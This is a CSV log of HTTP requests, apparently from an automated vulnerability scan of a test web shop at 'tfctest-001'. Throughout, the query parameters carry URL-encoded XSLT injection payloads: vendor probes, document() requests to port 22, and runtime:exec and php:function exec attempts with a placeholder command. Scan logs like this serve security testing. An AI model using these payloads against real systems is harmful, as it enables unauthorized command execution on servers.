ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
6621,Mon Sep 07 00:15:48 BDT 2026,Mon Sep 07 00:15:49 BDT 2026,POST,https://tfctest-001-production.up.railway.app/api/admin/products,200,OK,812,338,10
6622,Mon Sep 07 00:15:48 BDT 2026,Mon Sep 07 00:15:49 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/orders/1a19a224-88c5-44b5-a3f6-95c7faaaed85,400,Bad Request,727,347,27
6623,Mon Sep 07 00:15:48 BDT 2026,Mon Sep 07 00:15:49 BDT 2026,GET,https://tfctest-001-production.up.railway.app/?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,641,428,984
6624,Mon Sep 07 00:15:49 BDT 2026,Mon Sep 07 00:15:49 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/orders/79620a19-f2c4-428e-a717-5109bc688566,400,Bad Request,832,347,27
6625,Mon Sep 07 00:15:49 BDT 2026,Mon Sep 07 00:15:50 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/orders/24f10235-3943-4c1d-916f-f8a56cf92994,400,Bad Request,742,347,27
6626,Mon Sep 07 00:15:49 BDT 2026,Mon Sep 07 00:15:50 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/orders/1a19a224-88c5-44b5-a3f6-95c7faaaed85,400,Bad Request,757,347,27
6627,Mon Sep 07 00:15:49 BDT 2026,Mon Sep 07 00:15:50 BDT 2026,POST,https://tfctest-001-production.up.railway.app/api/admin/products,200,OK,1023,338,10
6628,Mon Sep 07 00:15:49 BDT 2026,Mon Sep 07 00:15:50 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/products/15,200,OK,1108,338,11
6629,Mon Sep 07 00:15:49 BDT 2026,Mon Sep 07 00:15:50 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/orders/79620a19-f2c4-428e-a717-5109bc688566,400,Bad Request,665,347,27
6630,Mon Sep 07 00:15:50 BDT 2026,Mon Sep 07 00:15:50 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/orders/24f10235-3943-4c1d-916f-f8a56cf92994,400,Bad Request,670,347,27
6631,Mon Sep 07 00:15:49 BDT 2026,Mon Sep 07 00:15:50 BDT 2026,GET,https://tfctest-001-production.up.railway.app/?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,570,428,984
6632,Mon Sep 07 00:15:50 BDT 2026,Mon Sep 07 00:15:50 BDT 2026,GET,https://tfctest-001-production.up.railway.app/api,404,Not Found,761,541,11478
6633,Mon Sep 07 00:15:50 BDT 2026,Mon Sep 07 00:15:50 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/orders/1a19a224-88c5-44b5-a3f6-95c7faaaed85,400,Bad Request,721,347,27
6634,Mon Sep 07 00:15:50 BDT 2026,Mon Sep 07 00:15:51 BDT 2026,POST,https://tfctest-001-production.up.railway.app/api/admin/products,200,OK,964,338,10
6635,Mon Sep 07 00:15:50 BDT 2026,Mon Sep 07 00:15:51 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/orders/24f10235-3943-4c1d-916f-f8a56cf92994,400,Bad Request,781,347,27
6636,Mon Sep 07 00:15:50 BDT 2026,Mon Sep 07 00:15:51 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?tab=%3C&_rsc=u5cN-QBuq4Vdenib,200,OK,1479,431,281759
6637,Mon Sep 07 00:15:50 BDT 2026,Mon Sep 07 00:15:51 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/orders/79620a19-f2c4-428e-a717-5109bc688566,400,Bad Request,1109,347,27
6638,Mon Sep 07 00:15:50 BDT 2026,Mon Sep 07 00:15:51 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/orders/1a19a224-88c5-44b5-a3f6-95c7faaaed85,400,Bad Request,800,347,27
6639,Mon Sep 07 00:15:50 BDT 2026,Mon Sep 07 00:15:51 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/products/15,200,OK,1268,338,11
6640,Mon Sep 07 00:15:49 BDT 2026,Mon Sep 07 00:15:50 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?_rsc=%3C,200,OK,535,431,281719
6641,Mon Sep 07 00:15:50 BDT 2026,Mon Sep 07 00:15:51 BDT 2026,GET,https://tfctest-001-production.up.railway.app/?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-001-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,563,428,984
6642,Mon Sep 07 00:15:51 BDT 2026,Mon Sep 07 00:15:52 BDT 2026,POST,https://tfctest-001-production.up.railway.app/api/admin/products,200,OK,823,338,10
6643,Mon Sep 07 00:15:51 BDT 2026,Mon Sep 07 00:15:52 BDT 2026,GET,https://tfctest-001-production.up.railway.app/api/admin,404,Not Found,729,541,11488
6644,Mon Sep 07 00:15:51 BDT 2026,Mon Sep 07 00:15:52 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/products/15,200,OK,821,338,11
6645,Mon Sep 07 00:15:52 BDT 2026,Mon Sep 07 00:15:52 BDT 2026,GET,https://tfctest-001-production.up.railway.app/?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,522,428,984
6646,Mon Sep 07 00:15:52 BDT 2026,Mon Sep 07 00:15:53 BDT 2026,POST,https://tfctest-001-production.up.railway.app/api/admin/products,200,OK,814,338,10
6647,Mon Sep 07 00:15:51 BDT 2026,Mon Sep 07 00:15:53 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?tab=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&_rsc=u5cN-QBuq4Vdenib,200,OK,1470,431,283324
6648,Mon Sep 07 00:15:52 BDT 2026,Mon Sep 07 00:15:53 BDT 2026,GET,https://tfctest-001-production.up.railway.app/api/admin/orders,404,Not Found,810,541,11499
6649,Mon Sep 07 00:15:52 BDT 2026,Mon Sep 07 00:15:53 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/products/15,200,OK,961,338,11
6650,Mon Sep 07 00:15:53 BDT 2026,Mon Sep 07 00:15:53 BDT 2026,GET,https://tfctest-001-production.up.railway.app/api/admin/products,405,Method Not Allowed,547,321,0
6651,Mon Sep 07 00:15:51 BDT 2026,Mon Sep 07 00:15:52 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,544,431,283851
6652,Mon Sep 07 00:15:53 BDT 2026,Mon Sep 07 00:15:53 BDT 2026,POST,https://tfctest-001-production.up.railway.app/api/admin/products,200,OK,823,338,10
6653,Mon Sep 07 00:15:53 BDT 2026,Mon Sep 07 00:15:53 BDT 2026,GET,https://tfctest-001-production.up.railway.app/?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,539,428,984
6654,Mon Sep 07 00:15:53 BDT 2026,Mon Sep 07 00:15:54 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/products/15,200,OK,812,338,11
6655,Mon Sep 07 00:15:53 BDT 2026,Mon Sep 07 00:15:54 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products,404,Not Found,506,435,271
6656,Mon Sep 07 00:15:53 BDT 2026,Mon Sep 07 00:15:54 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?tab=system-property%28%27xsl%3Avendor%27%29%2F%3E&_rsc=u5cN-QBuq4Vdenib,200,OK,1482,431,284301
6657,Mon Sep 07 00:15:53 BDT 2026,Mon Sep 07 00:15:54 BDT 2026,POST,https://tfctest-001-production.up.railway.app/api/admin/products,200,OK,830,338,10
6658,Mon Sep 07 00:15:53 BDT 2026,Mon Sep 07 00:15:54 BDT 2026,GET,https://tfctest-001-production.up.railway.app/checkout?_rsc=%3C,200,OK,563,429,1041
6659,Mon Sep 07 00:15:53 BDT 2026,Mon Sep 07 00:15:54 BDT 2026,GET,https://tfctest-001-production.up.railway.app/login?_rsc=%3C,200,OK,513,429,1038
6660,Mon Sep 07 00:15:54 BDT 2026,Mon Sep 07 00:15:55 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/products/15,200,OK,971,338,11
6661,Mon Sep 07 00:15:54 BDT 2026,Mon Sep 07 00:15:55 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/1?_rsc=%3C,200,OK,531,429,1105
6662,Mon Sep 07 00:15:53 BDT 2026,Mon Sep 07 00:15:54 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,547,431,284643
6663,Mon Sep 07 00:15:54 BDT 2026,Mon Sep 07 00:15:55 BDT 2026,POST,https://tfctest-001-production.up.railway.app/api/admin/products,200,OK,958,338,10
6664,Mon Sep 07 00:15:54 BDT 2026,Mon Sep 07 00:15:55 BDT 2026,GET,https://tfctest-001-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,531,429,1041
6665,Mon Sep 07 00:15:54 BDT 2026,Mon Sep 07 00:15:55 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/10?_rsc=%3C,200,OK,531,429,4492
6666,Mon Sep 07 00:15:54 BDT 2026,Mon Sep 07 00:15:55 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?tab=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&_rsc=u5cN-QBuq4Vdenib,200,OK,1355,431,284960
6667,Mon Sep 07 00:15:54 BDT 2026,Mon Sep 07 00:15:55 BDT 2026,GET,https://tfctest-001-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,546,429,1038
6668,Mon Sep 07 00:15:55 BDT 2026,Mon Sep 07 00:15:56 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/products/15,200,OK,858,338,11
6669,Mon Sep 07 00:15:55 BDT 2026,Mon Sep 07 00:15:55 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,431,429,1105
6670,Mon Sep 07 00:15:55 BDT 2026,Mon Sep 07 00:15:56 BDT 2026,POST,https://tfctest-001-production.up.railway.app/api/admin/products,200,OK,830,338,10
6671,Mon Sep 07 00:15:56 BDT 2026,Mon Sep 07 00:15:56 BDT 2026,GET,https://tfctest-001-production.up.railway.app/login?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,542,429,1038
6672,Mon Sep 07 00:15:55 BDT 2026,Mon Sep 07 00:15:56 BDT 2026,GET,https://tfctest-001-production.up.railway.app/checkout?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,549,429,1041
6673,Mon Sep 07 00:15:56 BDT 2026,Mon Sep 07 00:15:57 BDT 2026,PATCH,https://tfctest-001-production.up.railway.app/api/admin/products/15,200,OK,945,338,11
6674,Mon Sep 07 00:15:55 BDT 2026,Mon Sep 07 00:15:56 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,519,429,4492
6675,Mon Sep 07 00:15:56 BDT 2026,Mon Sep 07 00:15:56 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/1?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,516,429,1105
6676,Mon Sep 07 00:15:55 BDT 2026,Mon Sep 07 00:15:56 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,540,431,285770
6677,Mon Sep 07 00:15:56 BDT 2026,Mon Sep 07 00:15:57 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?tab=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&_rsc=u5cN-QBuq4Vdenib,200,OK,1560,431,286011
6678,Mon Sep 07 00:15:57 BDT 2026,Mon Sep 07 00:15:57 BDT 2026,GET,https://tfctest-001-production.up.railway.app/login?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,532,429,1038
6679,Mon Sep 07 00:15:57 BDT 2026,Mon Sep 07 00:15:57 BDT 2026,GET,https://tfctest-001-production.up.railway.app/checkout?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,595,429,1041
6680,Mon Sep 07 00:15:57 BDT 2026,Mon Sep 07 00:15:57 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/2?_rsc=%3C,200,OK,532,429,1105
6681,Mon Sep 07 00:15:57 BDT 2026,Mon Sep 07 00:15:57 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/1?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,532,429,1105
6682,Mon Sep 07 00:15:57 BDT 2026,Mon Sep 07 00:15:57 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/10?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,517,429,4492
6683,Mon Sep 07 00:15:57 BDT 2026,Mon Sep 07 00:15:57 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/15?_rsc=%3C,200,OK,548,429,4478
6684,Mon Sep 07 00:15:57 BDT 2026,Mon Sep 07 00:15:58 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?tab=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-001-production.up.railway.app%3A22%27%29%22%2F%3E&_rsc=u5cN-QBuq4Vdenib,200,OK,1293,431,286126
6685,Mon Sep 07 00:15:58 BDT 2026,Mon Sep 07 00:15:58 BDT 2026,GET,https://tfctest-001-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,513,429,1038
6686,Mon Sep 07 00:15:58 BDT 2026,Mon Sep 07 00:15:58 BDT 2026,GET,https://tfctest-001-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,513,429,1041
6687,Mon Sep 07 00:15:57 BDT 2026,Mon Sep 07 00:15:58 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,525,431,285803
6688,Mon Sep 07 00:15:58 BDT 2026,Mon Sep 07 00:15:58 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,513,429,1105
6689,Mon Sep 07 00:15:58 BDT 2026,Mon Sep 07 00:15:58 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,524,429,1105
6690,Mon Sep 07 00:15:58 BDT 2026,Mon Sep 07 00:15:59 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/10?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,525,429,4492
6691,Mon Sep 07 00:15:58 BDT 2026,Mon Sep 07 00:15:59 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/15?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,501,429,4478
6692,Mon Sep 07 00:15:58 BDT 2026,Mon Sep 07 00:16:00 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?tab=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&_rsc=u5cN-QBuq4Vdenib,200,OK,1307,431,286777
6693,Mon Sep 07 00:15:59 BDT 2026,Mon Sep 07 00:15:59 BDT 2026,GET,https://tfctest-001-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-001-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,483,429,1038
6694,Mon Sep 07 00:15:59 BDT 2026,Mon Sep 07 00:15:59 BDT 2026,GET,https://tfctest-001-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-001-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,516,429,1041
6695,Mon Sep 07 00:15:59 BDT 2026,Mon Sep 07 00:15:59 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/2?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,511,429,1105
6696,Mon Sep 07 00:15:59 BDT 2026,Mon Sep 07 00:16:00 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-001-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,512,429,1105
6697,Mon Sep 07 00:15:59 BDT 2026,Mon Sep 07 00:16:00 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,521,429,4492
6698,Mon Sep 07 00:15:59 BDT 2026,Mon Sep 07 00:16:00 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/15?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,515,429,4478
6699,Mon Sep 07 00:15:59 BDT 2026,Mon Sep 07 00:15:59 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-001-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,546,431,285803
6700,Mon Sep 07 00:16:00 BDT 2026,Mon Sep 07 00:16:00 BDT 2026,GET,https://tfctest-001-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,519,429,1041
6701,Mon Sep 07 00:16:00 BDT 2026,Mon Sep 07 00:16:00 BDT 2026,GET,https://tfctest-001-production.up.railway.app/login?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,644,429,1038
6702,Mon Sep 07 00:16:00 BDT 2026,Mon Sep 07 00:16:01 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/2?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,565,429,1105
6703,Mon Sep 07 00:16:00 BDT 2026,Mon Sep 07 00:16:01 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,516,429,1105
6704,Mon Sep 07 00:16:00 BDT 2026,Mon Sep 07 00:16:01 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?tab=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&_rsc=u5cN-QBuq4Vdenib,200,OK,1527,431,286100
6705,Mon Sep 07 00:16:01 BDT 2026,Mon Sep 07 00:16:01 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-001-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,510,429,4492
6706,Mon Sep 07 00:16:01 BDT 2026,Mon Sep 07 00:16:01 BDT 2026,GET,https://tfctest-001-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,516,429,1041
6707,Mon Sep 07 00:16:01 BDT 2026,Mon Sep 07 00:16:01 BDT 2026,GET,https://tfctest-001-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,531,429,1038
6708,Mon Sep 07 00:16:01 BDT 2026,Mon Sep 07 00:16:01 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/15?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,493,429,4478
6709,Mon Sep 07 00:16:01 BDT 2026,Mon Sep 07 00:16:02 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,491,429,1105
6710,Mon Sep 07 00:16:01 BDT 2026,Mon Sep 07 00:16:02 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,521,429,1105
6711,Mon Sep 07 00:16:01 BDT 2026,Mon Sep 07 00:16:01 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,513,431,285803
6712,Mon Sep 07 00:16:02 BDT 2026,Mon Sep 07 00:16:02 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,445,429,4492
6713,Mon Sep 07 00:16:02 BDT 2026,Mon Sep 07 00:16:03 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/3?_rsc=%3C,200,OK,523,429,1105
6714,Mon Sep 07 00:16:01 BDT 2026,Mon Sep 07 00:16:02 BDT 2026,GET,https://tfctest-001-production.up.railway.app/admin?tab=orders&_rsc=%3C,200,OK,523,430,11204
6715,Mon Sep 07 00:16:02 BDT 2026,Mon Sep 07 00:16:03 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-001-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,535,429,1105
6716,Mon Sep 07 00:16:02 BDT 2026,Mon Sep 07 00:16:03 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/5?_rsc=%3C,200,OK,550,429,1105
6717,Mon Sep 07 00:16:02 BDT 2026,Mon Sep 07 00:16:03 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/4?_rsc=%3C,200,OK,550,429,1105
6718,Mon Sep 07 00:16:02 BDT 2026,Mon Sep 07 00:16:03 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/15?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,530,429,4478
6719,Mon Sep 07 00:16:03 BDT 2026,Mon Sep 07 00:16:04 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/3?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,533,429,1105
6720,Mon Sep 07 00:16:03 BDT 2026,Mon Sep 07 00:16:03 BDT 2026,GET,https://tfctest-001-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,620,429,4492
